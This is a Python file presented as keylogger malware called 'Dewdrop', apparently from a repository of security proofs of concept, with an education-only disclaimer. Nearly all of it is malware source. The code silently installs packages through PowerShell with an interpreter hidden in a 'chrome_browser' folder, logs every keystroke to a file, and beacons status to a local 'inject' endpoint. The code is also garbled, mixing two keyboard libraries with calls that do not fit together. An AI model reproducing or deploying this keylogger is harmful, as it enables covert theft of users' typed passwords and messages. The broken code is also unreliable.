# -------------------------------------------------------------------------
# SECURITY RESEARCH & EDUCATIONAL PURPOSES ONLY
# This script is part of the BugWare repository, a collection of security tools
# and PoCs for learning about attack vectors.
# DO NOT USE THIS FOR ILLEGAL PURPOSES.
# -------------------------------------------------------------------------

"""
Dewdrop Malware - Chrome Service
Keylogger functionality using the keyboard library.

Created on: 2024-06-20
Author: Cyberpanther-Dev / ChatGPT
Suite: BugWare
Version: 1.0
"""

import os

os.system(r'''powershell.exe -NoProfile -Command "& 'C:\Users\Public\chrome_browser\python.exe' -m pip install pynput requests"''')

import requests
import base64
import pynput

KEYLOG = r"C:\Temp\keylog.txt"

from pynput import keyboard

def on_press(key, injected):
    try:
        print('alphanumeric key {} pressed; it was {}'.format(
            key.char, 'faked' if injected else 'not faked'))
        
        if key.state == keyboard.Key.space:
            with open(KEYLOG, 'a') as f:
                f.write(" ")
        
        elif key.state == keyboard.Key.enter:
            with open(KEYLOG, 'a') as f:
                f.write("\n")
        
        with open(KEYLOG, 'a') as f:
            f.write(f"{key.char}")
        
    except AttributeError:
        print('special key {} pressed'.format(
            key))

def on_release(key, injected):
    print('{} released; it was {}'.format(
        key, 'faked' if injected else 'not faked'))
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()

def start_keylogger():
    
    requests.get("http://localhost:8080/api/inject?status=keylogger_started")
    
    if os.path.exists(KEYLOG):
        os.remove(KEYLOG)
    
    open(KEYLOG, 'x').close()
    
    while True:
        key = keyboard.read_event()
        if key.event_type == keyboard.KEY_DOWN:
            with open(KEYLOG, 'a') as f:
                f.write(f"{key.name}")
        
        if keyboard.is_pressed('space'):
            with open(KEYLOG, 'a') as f:
                f.write(" ")
            keyboard.wait('space')
        
        if keyboard.is_pressed('enter'):
            with open(KEYLOG, 'a') as f:
                f.write("\n")
            keyboard.wait('enter')

        if keyboard.is_pressed('esc'):
            break
    
if __name__ == "__main__":
    requests.get("http://localhost:8080/api/inject?status=dewdrop_injection_success")
    start_keylogger()